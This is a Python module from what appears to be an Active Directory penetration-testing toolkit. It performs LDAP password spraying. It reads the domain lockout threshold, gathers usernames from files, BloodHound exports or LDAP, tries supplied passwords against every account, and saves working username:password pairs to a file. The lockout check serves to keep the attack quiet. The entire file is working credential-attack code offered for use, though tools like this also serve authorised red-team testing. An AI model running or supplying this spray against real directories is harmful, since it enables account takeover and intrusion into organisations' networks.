import os
import json
import glob
from core.logger import setup_logger
from rich.prompt import Prompt
import ldap3

logger = setup_logger()

def run_password_spray(dc_ip: str, domain: str, username: str, password: str, hashes: str, workspace: str, pass_list=None) -> bool:
    logger.info("[*] Initializing Safe Password Spray Module...")
    
    server = ldap3.Server(dc_ip, get_info=ldap3.ALL)
    auth_user = f"{domain}\\{username}" if domain else f"{dc_ip}\\{username}"
    auth_password = password if password else hashes
    auth_type = ldap3.NTLM
    
    conn = ldap3.Connection(server, user=auth_user, password=auth_password, authentication=auth_type)
    
    if not conn.bind():
        logger.error("[-] Failed to bind to LDAP for lockout policy check. Spraying aborted.")
        return False
        
    base_dn = server.info.other.get('defaultNamingContext', [None])[0]
    if not base_dn:
        logger.error("[-] Could not retrieve defaultNamingContext for lockout check.")
        return False
        
    # Check Lockout Policy
    conn.search(base_dn, '(objectClass=domainDNS)', attributes=['lockoutThreshold'])
    lockout_threshold = 0
    if len(conn.entries) > 0 and 'lockoutThreshold' in conn.entries[0]:
        lockout_threshold = int(str(conn.entries[0].lockoutThreshold))
        logger.info(f"[+] Domain Lockout Threshold is: {lockout_threshold}")
    else:
        logger.warning("[-] Could not detect Domain Lockout Threshold! Proceed with caution.")
        
    if lockout_threshold > 0 and lockout_threshold <= 3:
        logger.warning(f"[!] DANGEROUS: Domain Lockout Threshold is very low ({lockout_threshold}). Spraying is highly risky!")
        
    # Get Users
    target_users = []
    workspace_dir = os.path.join(os.getcwd(), 'workspaces', workspace)
    
    # Try reading from a local userlist.txt if it exists
    local_userlist = os.path.join(os.getcwd(), 'userlist.txt')
    if os.path.exists(local_userlist):
        logger.info(f"[*] Found external userlist: {local_userlist}")
        with open(local_userlist, 'r') as f:
            target_users = [line.strip().lower() for line in f if line.strip()]
    else:
        bh_users = glob.glob(os.path.join(workspace_dir, "*_users.json"))
        if bh_users:
            logger.info(f"[*] Found BloodHound users file: {bh_users[-1]}")
            try:
                with open(bh_users[-1], 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if 'data' in data:
                        for u in data['data']:
                            if 'Properties' in u and 'samaccountname' in u['Properties']:
                                target_users.append(u['Properties']['samaccountname'].lower())
            except Exception as e:
                logger.error(f"[-] Failed parsing BloodHound users: {e}")
                
        if not target_users:
            logger.info("[*] Querying LDAP directly for user list...")
            conn.search(base_dn, '(objectCategory=person)', attributes=['sAMAccountName'])
            for entry in conn.entries:
                if 'sAMAccountName' in entry:
                    target_users.append(str(entry.sAMAccountName).lower())
                    
    # Filter out empty and known bad accounts
    target_users = list(set([u for u in target_users if u and not u.endswith('$') and u != 'krbtgt']))
    logger.info(f"[+] Extracted {len(target_users)} target users for spraying.")
    
    # Get passwords to spray
    passwords_to_spray = []
    
    if pass_list:
        if os.path.exists(pass_list):
            logger.info(f"[*] Using external password list: {pass_list}")
            with open(pass_list, 'r', encoding='utf-8', errors='ignore') as f:
                passwords_to_spray = [line.strip() for line in f if line.strip()]
        else:
            passwords_to_spray = [pass_list]
    elif os.path.exists(os.path.join(os.getcwd(), 'passwordlist.txt')):
        local_passlist = os.path.join(os.getcwd(), 'passwordlist.txt')
        logger.info(f"[*] Found local password list: {local_passlist}")
        with open(local_passlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords_to_spray = [line.strip() for line in f if line.strip()]
    else:
        spray_pass = Prompt.ask("[bold yellow]Enter a single password to spray against all users (e.g., Spring2026!)[/bold yellow]")
        if spray_pass:
            passwords_to_spray = [spray_pass]
            
    if not passwords_to_spray:
        logger.error("[-] No passwords provided for spraying.")
        return False
        
    logger.info(f"[*] Starting SAFE spray of {len(passwords_to_spray)} password(s) against {len(target_users)} users...")
    logger.warning(f"[*] IMPORTANT: Only spraying ONE password per user per execution to avoid account lockouts.")
    
    # Safety feature: Only take the first password to avoid immediately getting banned!
    # Because a lockout of 3 means 3 bad attempts locks the user out! 
    if len(passwords_to_spray) > 1 and lockout_threshold > 0 and lockout_threshold <= 3:
        logger.warning(f"[!] DANGEROUS LOCKOUT: You provided {len(passwords_to_spray)} passwords but lockout policy is {lockout_threshold}.")
        logger.warning(f"[!] Safety override: Only spraying the FIRST password from the list: '{passwords_to_spray[0]}'")
        passwords_to_spray = [passwords_to_spray[0]]

    success_count = 0
    out_file = os.path.join(workspace_dir, 'spray_success.txt')
    
    for pwd in passwords_to_spray:
        for user in target_users:
            spray_auth_user = f"{domain}\\{user}" if domain else f"{dc_ip}\\{user}"
            try:
                spray_conn = ldap3.Connection(server, user=spray_auth_user, password=pwd, authentication=ldap3.SIMPLE, receive_timeout=2)
                if spray_conn.bind():
                    logger.info(f"[+] \033[32mCRITICAL SUCCESS: Valid Credentials Found -> {user}:{pwd}\033[0m")
                    success_count += 1
                    with open(out_file, 'a') as f:
                        f.write(f"{user}:{pwd}\n")
                spray_conn.unbind()
            except ldap3.core.exceptions.LDAPInvalidCredentialsResult:
                pass # Invalid password is expected
            except Exception as e:
                logger.debug(f"[-] LDAP Exception on {user}: {e}")
                
    if success_count > 0:
        logger.info(f"[+] Spray complete. {success_count} valid accounts discovered & saved to {out_file}")
    else:
        logger.info("[-] Spray complete. No valid credentials found.")
        
    return True
